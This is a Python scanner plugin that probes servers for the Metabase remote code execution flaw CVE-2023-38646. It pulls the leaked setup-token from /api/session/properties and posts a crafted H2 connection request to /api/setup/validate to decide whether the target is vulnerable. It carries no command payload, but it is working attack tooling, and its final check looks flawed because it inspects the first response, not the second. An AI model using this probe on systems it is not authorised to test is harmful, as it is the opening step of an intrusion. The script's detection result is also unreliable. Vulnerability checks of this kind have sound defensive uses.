#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/lhD7lTVcuL8NTXl5n4sphg',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Metabase 远程代码执行 CVE-2023-38646',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/api/session/properties'
  url1 = url + target
  ret['url'] = url1
  try:
    obj = re.compile(r'setup-token":"(?P<token>.*?)","application-colors')
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    # print(res.headers)
    if obj.search(res.text):
      result = obj.search(res.text)
      # print(result)
      token = result.group('token')
      if token != None:  
        headers['Content-Type'] = 'application/json'
        data= '''{"token":"'''+token+'''","details":{"is_on_demand":false,"is_full_sync":false,"is_sample":false,"cache_ttl":null,"refingerprint":true,"auto_run_queries":true,"schedules":{},"details":{},"name":"test","engine":"h2"}}'''
        resp = requests.post(url=url+'/api/setup/validate',headers=headers,data=data,timeout=5,verify=False)
        if resp.status_code == 400 and re.search(r'message.*?error.*?host.*?port.*?',res.text,re.S):
          res.close()
          ret['ifbug'] = True
          return ret
        else:
          return ret
      else:
        return ret
    else:
      return ret
  except:
    return ret